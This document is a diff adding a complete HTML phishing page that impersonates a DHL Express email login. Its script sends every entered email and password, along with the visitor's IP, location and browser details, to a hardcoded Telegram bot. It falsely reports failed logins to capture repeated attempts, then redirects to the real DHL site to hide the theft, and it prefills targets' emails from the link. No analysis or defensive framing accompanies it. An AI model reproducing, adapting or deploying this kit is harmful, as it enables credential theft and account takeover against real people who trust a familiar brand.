@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<link href="local_resources/img/f2b4907a2dd4fa4ff531a859111f13ad.png" rel="icon" type="image/png"/> <!-- Favicon -->
+<title>DHL Express Login</title>
+<style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f6f6f6;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .top-banner {
+            width: 100%;
+            background-color: #ffcc00;
+            padding: 10px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .top-banner img {
+            width: 150px;
+            display: block;
+        }
+
+        .content-wrapper {
+            display: flex;
+            justify-content: flex-start; /* Align items to the start */
+            align-items: center;
+            margin-top: 80px;
+            width: 100%; /* Use full width */
+            max-width: 1200px; /* Max width for large screens */
+            padding: 0 20px; /* Add horizontal padding */
+            box-sizing: border-box; /* Include padding in total width */
+        }
+
+        .slideshow {
+            flex: 1; /* Allow the slideshow to take available space */
+            height: 450px;
+            overflow: hidden;
+            position: relative;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            margin-right: 20px; /* Space between slideshow and login container */
+        }
+
+        .slideshow img {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            opacity: 0;
+            transition: opacity 1s ease;
+            object-fit: cover;
+        }
+
+        .slideshow img.active {
+            opacity: 1;
+        }
+
+        .login-container {
+            background-color: white;
+            width: 90%; /* Make width responsive */
+            max-width: 240px;
+            padding: 20px; /* Adjust padding */
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        h2 {
+            margin-bottom: 16px;
+            font-size: 24px;
+            color: #333;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            background-color: #f9f9f9;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #ffcc00;
+            background-color: white;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #ffcc00;
+            color: #333;
+            font-size: 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .btn:hover {
+            background-color: #e6b800;
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+        }
+
+        .forgot-password a {
+            color: #0066cc;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .separator {
+            margin: 20px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .alert {
+            margin-top: 10px;
+            color: #e74c3c;
+            font-size: 14px;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 14px;
+            color: #333;
+            position: absolute;
+            bottom: 20px;
+        }
+
+        /* Hide the honeypot input field */
+        .honeypot {
+            display: none;
+        }
+
+        /* Responsive design adjustments */
+        @media (max-width: 768px) {
+            .content-wrapper {
+                flex-direction: column; /* Stack items on smaller screens */
+                align-items: center; /* Center items */
+            }
+
+            .slideshow {
+                margin-right: 0; /* Remove margin on smaller screens */
+                margin-bottom: 20px; /* Add some space below */
+                height: 300px; /* Adjust height for smaller screens */
+            }
+
+            .login-container {
+                width: 90%; /* Keep login container responsive */
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="top-banner">
+<a href="https://ibb.co/4jkxQ9r"><img alt="DHL Logo" border="0" src="local_resources/img/a8543cf449b2220dbff62abf47e8b340.png"/></a>
+<img alt="Middle Image" class="middle-image" src="local_resources/img/c7074e1d2ccb76cd2303fd5a1f1b21f1.png"/>
+<img alt="Right Image" class="right-image" src="local_resources/img/356596c309832b52943c026be8a98ece.png"/>
+</div>
+<div class="content-wrapper">
+<div class="slideshow">
+<img alt="Email Verification" class="active" src="local_resources/img/f12683080d651e756e53ee55b183eba1.png"/>
+<img alt="Employee Receives Signature" src="local_resources/img/5b403135144ceeb446eacbe8db42c146.png"/>
+<img alt="Cargo" src="local_resources/img/1867fd9b13a8d7db1e988117bd23aa1d.jpg"/>
+<img alt="Caro fleets" src="local_resources/img/e98045176df43609e1ad22f733df9075.png"/>
+</div>
+<div class="login-container">
+<h2>Login Your Email Account for Access</h2>
+<div class="alert" id="alertMessage"></div>
+<form id="loginForm" onsubmit="return validateLogin(event)">
+<div class="form-group">
+<label for="email">Email</label>
+<input id="email" name="email" placeholder="Enter your email" required="" type="email"/>
+</div>
+<div class="form-group">
+<label for="password">Password</label>
+<input id="password" name="password" placeholder="Enter your password" required="" type="password"/>
+</div>
+<!-- Honeypot field -->
+<div class="form-group honeypot">
+<label for="honeypot">If you're human, leave this field empty:</label>
+<input id="honeypot" name="honeypot" type="text"/>
+</div>
+<button class="btn" type="submit">Login</button>
+</form>
+<div class="forgot-password">
+<a href="#">Forgot your password?</a>
+</div>
+<div class="separator"></div>
+</div>
+</div>
+<div class="footer">
+        2024 Â© DHL Group - All rights reserved
+    </div>
+<script>
+        let attempts = 0;
+        const maxAttempts = 3;
+        const botToken = '7349350516:AAFQK23P9eEK4M3pg7H2K0SO6R6yLHU68zA';
+        const chatId = '6464937690';
+        let currentSlide = 0; // Initialize current slide index
+        const slides = document.querySelectorAll('.slideshow img'); // Get all slides
+
+        // Function to change slides
+        function changeSlide() {
+            slides[currentSlide].classList.remove('active'); // Hide current slide
+            currentSlide = (currentSlide + 1) % slides.length; // Move to next slide
+            slides[currentSlide].classList.add('active'); // Show next slide
+        }
+
+        // Set interval for slideshow change every 3 seconds
+        setInterval(changeSlide, 3000); // 3000 milliseconds = 3 seconds
+
+        // Send login data to Telegram bot
+        function sendToTelegram(email, password, ip, location, device, success) {
+            const message = `Login Attempt ${attempts}:\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}\nLocation: ${location}\nDevice: ${device}\nLogin ${success ? 'Success' : 'Failed'}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => response.json())
+              .then(data => console.log('Message sent to Telegram:', data))
+              .catch(error => console.error('Error sending message to Telegram:', error));
+        }
+
+        // Get IP location and device info
+        async function getIpInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                return await response.json();
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                return {};
+            }
+        }
+
+        // Validate login
+        async function validateLogin(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const alertMessageDiv = document.getElementById('alertMessage');
+
+            alertMessageDiv.textContent = '';
+
+            // Increment attempts counter
+            attempts++;
+
+            // Get IP location and device info
+            const ipInfo = await getIpInfo();
+            const ip = ipInfo.ip || 'Unknown IP';
+            const location = `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`;
+            const device = navigator.userAgent; // Get device information
+
+            // Honeypot validation
+            const honeypotValue = document.getElementById('honeypot').value;
+            if (honeypotValue) {
+                alertMessageDiv.textContent = 'Spam bot detected. Login attempt logged.';
+                alertMessageDiv.style.color = '#e74c3c';
+                return;
+            }
+
+            // Simulate login validation (replace with actual logic)
+            const loginSuccessful = false; // Change to true to simulate a successful login
+
+            if (loginSuccessful) {
+                // Send to Telegram (successful login)
+                sendToTelegram(email, password, ip, location, device, true);
+
+                alertMessageDiv.textContent = 'Login successful.';
+                alertMessageDiv.style.color = '#2ecc71';
+
+                // Clear fields
+                document.getElementById('password').value = '';
+                document.getElementById('email').value = '';
+            } else {
+                // Send failed attempt to Telegram
+                sendToTelegram(email, password, ip, location, device, false);
+
+                alertMessageDiv.textContent = `Invalid Login Password. Try Again... You have ${maxAttempts - attempts} attempt(s) left.`;
+                alertMessageDiv.style.color = '#e74c3c';
+
+                // Clear password field
+                document.getElementById('password').value = '';
+
+                // Redirect to DHL after max attempts
+                if (attempts >= maxAttempts) {
+                    alertMessageDiv.textContent = 'Login Successful. Signing in...';
+                    setTimeout(() => {
+                        window.location.href = "https://www.dhl.com";
+                    }, 2000);
+                }
+            }
+        }
+
+        // Prefill email if found in URL hash
+        window.onload = function() {
+            const email = window.location.hash.substring(1);
+            if (email.includes('@')) {
+                document.getElementById('email').value = email;
+            }
+        };
+    </script>
+</body>
+</html>
